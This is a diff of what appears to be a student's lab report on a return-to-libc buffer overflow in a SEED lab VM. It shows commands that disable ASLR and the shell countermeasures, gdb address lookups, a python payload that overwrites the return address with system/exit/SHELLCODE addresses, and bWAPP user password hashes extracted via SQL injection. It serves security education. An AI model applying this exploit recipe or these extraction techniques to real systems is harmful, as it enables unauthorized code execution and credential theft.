@@ -95,40 +95,55 @@ void main() {
 ***Idea***
 
 
+My idea for this task is to inject the system address into the return address, so that when the program finishes, it will redirect to the system function. When the system function is loaded into the stack frame, I will load the address of the SHELLCODE environment variable that we have exported into the parameter of the system address.
+
+
+
+
 ***2. Attack***
 ***2.1. Compile file***
 Compile the vulnerable.c and shellcode.c with following command: 
-- gcc -g vulnerable.c -o vulnerable.out -fno-stack-protector -mpreferred-stack-boundary=2
-- gcc -g shellcode.c -o shellcode.out -fno-stack-protector -mpreferred-stack-boundary=2
+```
+gcc -g vulnerable.c -o vulnerable.out -fno-stack-protector -mpreferred-stack-boundary=2
+```
 
+```
+gcc -g shellcode.c -o shellcode.out -fno-stack-protector -mpreferred-stack-boundary=2
+```
 
 ***2.2. Disabling Security Features***
 
 Create a link to zsh instead of the default dash to disable the bash countermeasures in Ubuntu 16.04.
-
+```
 sudo ln -sf /bin/zsh /bin/sh
-
+```
 
 Disable the operating system's address space layout randomization.
 
-
+```
 sudo sysctl -w kernel.randomize_va_space=0
-
+```
 
 ***2.3. Export environment variable***
 Then, we declare an environment variable named SHELLCODE to store the path of the output file after compiling shellcode.c.
 
+```
 export SHELLCODE=/home/seed/seclabs/bof/shellcode.o
+```
 
 ***2.4. Debug vulnerable.c file with gdb to find the address of system function, exit fuction, SHELLCODE variable***
 Run code & debug:
+```
 gdb -q env.out
 start
+```
 Then find the neccessary address:
+
+```
 p system
 p exit
 print getenv("SHELLCODE")
-
+```
 
 ![image](https://github.com/user-attachments/assets/aa843bb3-8121-4d7f-abb0-e679acf38d90)
 
@@ -141,7 +156,12 @@ Address of VULNP: 0xffffd8fd
 
 ***2.5. ATTACK***
 Run the command: 
+```
   run $(python -c "print('a'*20 + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' + '\xfd\xd8\xff\xff')")
+```
+Explain command: This command first overwrites the return address with the system function's address. Once the system function is loaded, the stack will interpret the next memory location (ebp+4) as the return address. To ensure the program exits cleanly, I will then place the exit function address here. Finally, for the system function's parameter (located at ebp+8), I will provide the address of the SHELLCODE environment variable. This way, when the system function runs, it will execute the code stored in the SHELLCODE variable.
+
+
 After running command, here's the result:
 
 ![image](https://github.com/user-attachments/assets/cba772fc-cbf6-4b33-8d46-297bf7a9a9e8)
@@ -286,6 +306,8 @@ User 1:
 Email: bwapp-aim@mailinator.com
 Login: A.I.M.
 Password (Hashed): 6885858486f31043e5839c735d99457f045affd0
+
+
 User 2:
 
 Email: bwapp-bee@mailinator.com
@@ -342,9 +364,6 @@ Login thành công và ta có thể thấy được đã vào được trang ch�
 
 ![image](https://github.com/user-attachments/assets/a591b179-62b1-4455-94ff-b4d0b52f5b2e)
 
-
-
-![image](https://github.com/user-attachments/assets/8e5bf38b-61f3-4f7e-8505-acc23a07c391)
 
 
 
